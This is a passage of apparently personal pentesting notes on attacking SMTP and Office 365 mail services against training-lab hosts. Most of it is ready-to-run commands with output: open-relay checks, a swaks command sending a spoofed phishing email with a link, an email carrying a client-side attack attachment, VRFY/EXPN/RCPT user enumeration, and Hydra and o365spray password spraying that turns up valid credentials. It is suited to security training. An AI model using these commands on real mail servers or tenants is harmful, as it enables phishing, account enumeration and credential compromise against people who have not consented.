---
title: "smtp"
weight: 11
---
| Step | Tool/Command | Purpose |
| --- | --- | --- |
| Port + Banner check | `nmap -p 25 --script=smtp* <ip>` | Service & vuln info |
| Open relay test | `nmap -p 25 --script=smtp-open-relay <ip>` | Check relay status |
| User enumeration | `nmap -p 25 --script=smtp-enum-users <ip>` | Find valid users |
| Send test mail | `swaks --to victim@domain.com --server <ip>` | Test open relay/send mail |

&nbsp;

&nbsp;

&nbsp;

irfan@irfan-VirtualBox:~$ sudo nmap 127.0.0.1 -sC -sV -p25  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-05 16:00 EST  
Nmap scan report for localhost (127.0.0.1)  
Host is up (0.000095s latency).

PORT STATE SERVICE VERSION  
25/tcp open smtp Postfix smtpd  
| ssl-cert: Subject: commonName=mint  
| Subject Alternative Name: DNS:mint  
| Not valid before: 2025-03-01T06:22:06  
|\_Not valid after: 2035-02-27T06:22:06  
|\_ssl-date: TLS randomness does not represent time  
|\_smtp-commands: irfan-VirtualBox.hsd1.ct.comcast.net, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING  
Service Info: Host: irfan-VirtualBox.hsd1.ct.comcast.net

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 1.72 seconds

CHECK FOR OPEN RELAY

```
sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
```

```shell-session
cube111@local[/local]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
Nmap scan report for 10.10.11.213
Host is up (0.28s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
```

Next, we can use any mail client to connect to the mail server and send our email.

Attacking Email Services

```shell-session
cube111@local[/local]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213

=== Trying 10.10.11.213:25...
=== Connected to 10.10.11.213.
<-  220 mail.localdomain SMTP Mailer ready
 -> EHLO parrot
<-  250-mail.localdomain
<-  250-SIZE 33554432
<-  250-8BITMIME
<-  250-STARTTLS
<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
<-  250 HELP
 -> MAIL FROM:<notifications@inlanefreight.com>
<-  250 OK
 -> RCPT TO:<employees@inlanefreight.com>
<-  250 OK
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 29 Oct 2020 01:36:06 -0400
 -> To: employees@inlanefreight.com
 -> From: notifications@inlanefreight.com
 -> Subject: Company Notification
 -> Message-Id: <20201029013606.775675@parrot>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
 -> 
 -> 
 -> .
<-  250 OK
 -> QUIT
<-  221 Bye
=== Connection closed with remote host.




sendemail -f 'jonas@localhost' -t 'mailadmin@localhost' -s 192.168.184.140:25 -u 'another spreadsheet' -m 'spreadsheet' -a /home/kali/pentestools/windows/clientside/test.ods
Feb 23 15:54:03 kali sendemail[3004302]: Email was sent successfully!
```

&nbsp;

&nbsp;

| **Port** | **Service** |
| --- | --- |
| `TCP/25` | SMTP Unencrypted |
| `TCP/143` | IMAP4 Unencrypted |
| `TCP/110` | POP3 Unencrypted |
| `TCP/465` | SMTP Encrypted |
| `TCP/587` | SMTP Encrypted/[STARTTLS](https://en.wikipedia.org/wiki/Opportunistic_TLS) |
| `TCP/993` | IMAP4 Encrypted |
| `TCP/995` | POP3 Encrypted |

&nbsp;

&nbsp;

&nbsp;

&nbsp;

| Client (`MUA`) | `➞` | Submission Agent (`MSA`) | `➞` | Open Relay (`MTA`) | `➞` | Mail Delivery Agent (`MDA`) | `➞` | Mailbox (`POP3`/`IMAP`) |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

&nbsp;

| **Command** | **Description** |
| --- | --- |
| `AUTH PLAIN` | AUTH is a service extension used to authenticate the client. |
| `HELO` | The client logs in with its computer name and thus starts the session. |
| `MAIL FROM` | The client names the email sender. |
| `RCPT TO` | The client names the email recipient. |
| `DATA` | The client initiates the transmission of the email. |
| `RSET` | The client aborts the initiated transmission but keeps the connection between client and server. |
| `VRFY` | The client checks if a mailbox is available for message transfer. |
| `EXPN` | The client also checks if a mailbox is available for messaging with this command. |
| `NOOP` | The client requests a response from the server to prevent disconnection due to time-out. |
| `QUIT` | The client terminates the session. |

&nbsp;

&nbsp;

&nbsp;

&nbsp;

EHLOSMTP

```shell-session
cube111@local[/local]$ telnet 10.129.14.128 25

Trying 10.129.14.128...
Connected to 10.129.14.128.
Escape character is '^]'.
220 ESMTP Server


EHLO inlanefreight.local

250-mail1.inlanefreight.local
250-PIPELINING
250-SIZE 10240000
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING


MAIL FROM: <cry0l1t3@inlanefreight.local>

250 2.1.0 Ok


RCPT TO: <mrb3n@inlanefreight.local> NOTIFY=success,failure

250 2.1.5 Ok


DATA

354 End data with <CR><LF>.<CR><LF>

From: <cry0l1t3@inlanefreight.local>
To: <mrb3n@inlanefreight.local>
Subject: DB
Date: Tue, 28 Sept 2021 16:32:51 +0200
Hey man, I am trying to access our XY-DB but the creds don't work. 
Did you make any changes there?
.

250 2.0.0 Ok: queued as 6E1CF1681AB


QUIT

221 2.0.0 Bye
Connection closed by foreign host.
```

&nbsp;

&nbsp;

#### VRFY Command

```shell-session
[!bash!]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


VRFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data


VRFY new-user

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```

&nbsp;

&nbsp;

#### EXPN Command

```shell-session
[!bash!]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


EXPN john

250 2.1.0 john@inlanefreight.local


EXPN support-team

250 2.0.0 carol@inlanefreight.local
250 2.1.5 elisa@inlanefreight.local
```

&nbsp;

&nbsp;

smts secure tls

openssl s_client -connect smtp.gmail.com:587 -tls1_2 -starttls smtp

openssl s_client -connect 10.129.14.128:imaps

&nbsp;

VRFY BRUTE

smtp-user-enum -M VRFY -U k -t 10.129.26.44 -w 10 -v

```shell-session
[!bash!]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.local -t 10.129.203.7

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... userlist.txt
Target count ............. 1
Username count ........... 78
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.local

######## Scan started at Thu Apr 21 06:53:07 2022 #########
10.129.203.7: jose@inlanefreight.local exists
10.129.203.7: pedro@inlanefreight.local exists
10.129.203.7: kate@inlanefreight.local exists
######## Scan completed at Thu Apr 21 06:53:18 2022 #########
3 results.

78 queries in 11 seconds (7.1 queries / sec)
```

&nbsp;

&nbsp;

## Password Attacks-Spray

#### Hydra - Password Attack

```shell-session
[!bash!]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task
[DATA] attacking pop3://10.10.110.20:110/
[110][pop3] host: 10.129.42.197   login: john   password: Company01!
1 of 1 target successfully completed, 1 valid password found
```

&nbsp;

&nbsp;

&nbsp;

```
cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"
```

error codes

https://serversmtp.com/smtp-error/

&nbsp;

**Microsoft  oulook /365 enumeration**

#### O365 Spray

```shell-session
[!bash!]$ python3 o365spray.py --validate --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > validate       :  True
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:46:40

>----------------------------------------<

[2022-04-13 09:46:40,344] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
```

Now, we can attempt to identify usernames.

```shell-session
[!bash!]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
                                       
            *** O365 Spray ***             

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > enum           :  True
   > userfile       :  users.txt
   > enum_module    :  office
   > rate           :  10 threads
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:48:03

>----------------------------------------<

[2022-04-13 09:48:03,621] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:48:04,062] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users
[2022-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : 

[ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2204130948.txt'
[ * ] All enumerated accounts can be found at: '/opt/o365spray/enum/enum_tested_accounts.2204130948.txt'

[2022-04-13 09:48:10,416] INFO : Valid Accounts: 2
```

&nbsp;

#### O365 Spray - Password Spraying

```shell-session
[!bash!]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > spray          :  True
   > password       :  March2022!
   > userfile       :  usersfound.txt
   > count          :  1 passwords/spray
   > lockout        :  1.0 minutes
   > spray_module   :  oauth2
   > rate           :  10 threads
   > safe           :  10 locked accounts
   > timeout        :  25 seconds
   > start          :  2022-04-14 12:26:31

>----------------------------------------<

[2022-04-14 12:26:31,757] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-14 12:26:32,201] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-14 12:26:32,202] INFO : Running password spray against 2 users.
[2022-04-14 12:26:32,202] INFO : Password spraying the following passwords: ['March2022!']
[2022-04-14 12:26:33,025] INFO : [VALID] lewen@msplaintext.xyz:March2022!
[2022-04-14 12:26:33,048] INFO : 

[ * ] Writing valid credentials to: '/opt/o365spray/spray/spray_valid_credentials.2204141226.txt'
[ * ] All sprayed credentials can be found at: '/opt/o365spray/spray/spray_tested_credentials.2204141226.txt'

[2022-04-14 12:26:33,048] INFO : Valid Credentials: 1
```

&nbsp;

&nbsp;

&nbsp;

# Latest Email Service Vulnerabilities

* * *

One of the most recent publicly disclosed and dangerous [Simple Mail Transfer Protocol (SMTP)](https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol) vulnerabilities was discovered in [OpenSMTPD](https://www.opensmtpd.org/) up to version 6.6.2 service was in 2020. This vulnerability was assigned [CVE-2020-7247](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247) and leads to RCE. It has been exploitable since 2018. This service has been used in many different Linux distributions, such as Debian, Fedora, FreeBSD, and others. The dangerous thing about this vulnerability is the possibility of executing system commands remotely on the system and that exploiting this vulnerability does not require authentication.